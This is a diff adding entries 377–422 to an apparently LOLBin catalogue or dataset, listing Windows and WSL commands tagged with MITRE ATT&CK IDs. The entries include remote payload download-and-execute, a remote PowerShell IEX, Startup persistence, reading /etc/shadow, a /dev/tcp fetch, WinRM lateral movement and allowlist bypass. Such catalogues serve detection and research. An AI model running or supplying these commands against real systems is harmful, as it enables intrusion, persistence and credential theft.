+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":377,
+        "Command":"Update.exe --updateRollback={REMOTEURL}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":378,
+        "Command":"Update.exe --updateRollback={REMOTEURL}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":379,
+        "Command":"Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"",
+        "Description":"Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":380,
+        "Command":"Update.exe --updateRollback={PATH_SMB:folder}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":381,
+        "Command":"Update.exe --updateRollback={PATH_SMB:folder}",
+        "Description":"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":382,
+        "Command":"Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"",
+        "Description":"Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":383,
+        "Command":"Update.exe --createShortcut={PATH:.exe} -l=Startup",
+        "Description":"Copy your payload into \"%localappdata%\\Microsoft\\Teams\\current\\\". Then run the command. Update.exe will create a shortcut to the specified executable in \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\". Then payload will run on every login of the user who runs it. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1547",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":384,
+        "Command":"Update.exe --removeShortcut={PATH:.exe}-l=Startup",
+        "Description":"Run the command to remove the shortcut created in the \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" directory you created with the LolBinExecution \"--createShortcut\" described on this page. Binary to update the existing installed Nuget\/squirrel package. Part of Microsoft Teams installation.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1070",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":385,
         "Command":"VSDiagnostics.exe start 1 \/launch:{PATH:.exe}",
         "Description":"Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable. Command-line tool used for performing diagnostics.",
         "RiskScore":"",
@@ -2184,7 +4620,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":183,
+        "ID":386,
+        "Command":"VSDiagnostics.exe start 2 \/launch:{PATH:.exe} \/launchArgs:\"{CMD:args}\"",
+        "Description":"Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW. Command-line tool used for performing diagnostics.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":387,
         "Command":"VSIISExeLauncher.exe -p {PATH:.exe} -a \"{CMD:args}\"",
         "Description":"The above binary will execute other binary. Binary will execute specified binary. Part of VS\/VScode installation.",
         "RiskScore":"",
@@ -2196,7 +4644,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":184,
+        "ID":388,
         "Command":"Visio.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server Microsoft Visio Executable",
         "RiskScore":"",
@@ -2208,7 +4656,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":185,
+        "ID":389,
         "Command":"VisualUiaVerifyNative.exe",
         "Description":"Generate Serialized gadget and save to - C:\\Users\\[current user]\\AppData\\Roaminguiverify.config before executing. A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.",
         "RiskScore":"",
@@ -2220,7 +4668,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":186,
+        "ID":390,
         "Command":"VSLaunchBrowser.exe .exe {REMOTEURL:.exe}",
         "Description":"Download and execute payload from remote server Microsoft Visual Studio browser launcher tool for web applications debugging",
         "RiskScore":"",
@@ -2232,7 +4680,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":187,
+        "ID":391,
+        "Command":"VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}",
+        "Description":"Execute payload via VSLaunchBrowser as parent process Microsoft Visual Studio browser launcher tool for web applications debugging",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":392,
+        "Command":"VSLaunchBrowser.exe .exe {PATH_SMB}",
+        "Description":"Execute payload from WebDAV server via VSLaunchBrowser as parent process Microsoft Visual Studio browser launcher tool for web applications debugging",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":393,
         "Command":"vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:",
         "Description":"Executes specified executable from vshadow.exe. VShadow is a command-line tool that can be used to create and manage volume shadow copies.",
         "RiskScore":"",
@@ -2244,7 +4716,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":188,
+        "ID":394,
         "Command":"Vsjitdebugger.exe {PATH:.exe}",
         "Description":"Executes specified executable as a subprocess of Vsjitdebugger.exe. Just-In-Time (JIT) debugger included with Visual Studio",
         "RiskScore":"",
@@ -2256,7 +4728,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":189,
+        "ID":395,
         "Command":"WFMFormat.exe",
         "Description":"Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5. Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.",
         "RiskScore":"",
@@ -2268,7 +4740,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":190,
+        "ID":396,
         "Command":"wfc.exe {PATH_ABSOLUTE:.xoml}",
         "Description":"Execute arbitrary C# code embedded in a XOML file. The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).",
         "RiskScore":"",
@@ -2280,7 +4752,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":191,
+        "ID":397,
         "Command":"WinProj.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server Microsoft Project Executable",
         "RiskScore":"",
@@ -2292,7 +4764,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":192,
+        "ID":398,
         "Command":"winword.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server Microsoft Office binary",
         "RiskScore":"",
@@ -2304,7 +4776,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":193,
+        "ID":399,
         "Command":"wsl.exe -e \/mnt\/c\/Windows\/System32\/calc.exe",
         "Description":"Executes calc.exe from wsl.exe Windows subsystem for Linux executable",
         "RiskScore":"",
@@ -2316,7 +4788,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":194,
+        "ID":400,
+        "Command":"wsl.exe -u root -e cat \/etc\/shadow",
+        "Description":"Cats \/etc\/shadow file as root Windows subsystem for Linux executable",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":401,
+        "Command":"wsl.exe --exec bash -c \"{CMD}\"",
+        "Description":"Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`) Windows subsystem for Linux executable",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":402,
+        "Command":"wsl.exe --exec bash -c 'cat < \/dev\/tcp\/192.168.1.10\/54 > binary'",
+        "Description":"Downloads file from 192.168.1.10 Windows subsystem for Linux executable",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":403,
         "Command":"devtunnel.exe host -p 8080",
         "Description":"Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet. Binary to enable forwarded ports on windows operating systems.",
         "RiskScore":"",
@@ -2328,7 +4836,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":195,
+        "ID":404,
         "Command":"vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}",
         "Description":"Load a library payload using the --agentExtensionPath parameter (32-bit) Agent for Visual Studio Live Share (Code Collaboration)",
         "RiskScore":"",
@@ -2340,7 +4848,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":196,
+        "ID":405,
         "Command":"vstest.console.exe {PATH:.dll}",
         "Description":"VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general VSTest.Console.exe is the command-line tool to run tests",
         "RiskScore":"",
@@ -2352,7 +4860,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":197,
+        "ID":406,
         "Command":"winfile.exe {PATH:.exe}",
         "Description":"Execute an executable file with WinFile as a parent process. Windows File Manager executable",
         "RiskScore":"",
@@ -2364,7 +4872,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":198,
+        "ID":407,
         "Command":"xsd.exe {REMOTEURL}",
         "Description":"Downloads payload from remote server XML Schema Definition Tool included with the Windows Software Development Kit (SDK).",
         "RiskScore":"",
@@ -2376,7 +4884,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":199,
+        "ID":408,
         "Command":"powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\testing\\fun.dll;[Program]::Fun()\"",
         "Description":"Proxy execute Managed DLL with PowerShell PowerShell Diagnostic Script",
         "RiskScore":"",
@@ -2388,7 +4896,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":200,
+        "ID":409,
         "Command":". C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess {PATH:.ps1}",
         "Description":"Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable. Proxy execution with CL_Mutexverifiers.ps1",
         "RiskScore":"",
@@ -2400,7 +4908,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":201,
+        "ID":410,
         "Command":". C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \\nSyncInvoke {CMD}",
         "Description":"Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable. Aero diagnostics script",
         "RiskScore":"",
@@ -2412,7 +4920,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":202,
+        "ID":411,
         "Command":"powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}",
         "Description":"Execute binaries from the context of the signed script using the \"VsWherePath\" flag. Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet",
         "RiskScore":"",
@@ -2424,7 +4932,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":203,
+        "ID":412,
+        "Command":"powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsInstallationPath \"\/..\/..\/..\/..\/..\/; {PATH:.exe} ;\"",
+        "Description":"Execute binaries and commands from the context of the signed script using the \"VsInstallationPath\" flag. Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1216",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":413,
         "Command":"set comspec={PATH_ABSOLUTE:.exe} & cscript c:\\windows\\system32\\manage-bde.wsf",
         "Description":"Set the comspec variable to another executable prior to calling manage-bde.wsf for execution. Script for managing BitLocker",
         "RiskScore":"",
@@ -2436,7 +4956,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":204,
+        "ID":414,
+        "Command":"copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf",
+        "Description":"Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file. Script for managing BitLocker",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1216",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":415,
         "Command":"pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}",
         "Description":"Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection Proxy execution with Pubprn.vbs",
         "RiskScore":"",
@@ -2448,7 +4980,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":205,
+        "ID":416,
         "Command":"SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"",
         "Description":"Inject PowerShell script code with the provided arguments Script used related to app-v and publishing server",
         "RiskScore":"",
@@ -2460,7 +4992,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":206,
+        "ID":417,
         "Command":"powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\"",
         "Description":"Proxy execute Managed DLL with PowerShell PowerShell Diagnostic Script",
         "RiskScore":"",
@@ -2472,7 +5004,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":207,
+        "ID":418,
         "Command":"winrm invoke Create wmicimv2\/Win32_Process @{CommandLine=\"{CMD}\"} -r:http:\/\/target:5985",
         "Description":"Lateral movement\/Remote Command Execution via WMI Win32_Process class over the WinRM protocol Script used for manage Windows RM settings",
         "RiskScore":"",
@@ -2484,7 +5016,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":208,
+        "ID":419,
+        "Command":"winrm invoke Create wmicimv2\/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"{CMD}\"} -r:http:\/\/acmedc:5985 && winrm invoke StartService wmicimv2\/Win32_Service?Name=Evil -r:http:\/\/acmedc:5985",
+        "Description":"Lateral movement\/Remote Command Execution via WMI Win32_Service class over the WinRM protocol Script used for manage Windows RM settings",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1216",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":420,
+        "Command":"%SystemDrive%\\BypassDir\\cscript \/\/nologo %windir%\\System32\\winrm.vbs get wmicimv2\/Win32_Process?Handle=4 -format:pretty",
+        "Description":"Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe. Script used for manage Windows RM settings",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1220",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":421,
         "Command":"Pester.bat [\/help|?|-?|\/?] \"$null; {CMD}\"",
         "Description":"Execute code using Pester. The third parameter can be anything. The fourth is the payload. Used as part of the Powershell pester",
         "RiskScore":"",
@@ -2492,6 +5048,18 @@
         "MitreAttackClassification":"T1216",
         "ProgrammingLanguage":"",
         "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":422,
+        "Command":"Pester.bat ;{PATH:.exe}",
+        "Description":"Execute code using Pester. Example here executes specified executable. Used as part of the Powershell pester",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1216",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
         "DynTested":"",
         "ObfuscationLevel":""
     }
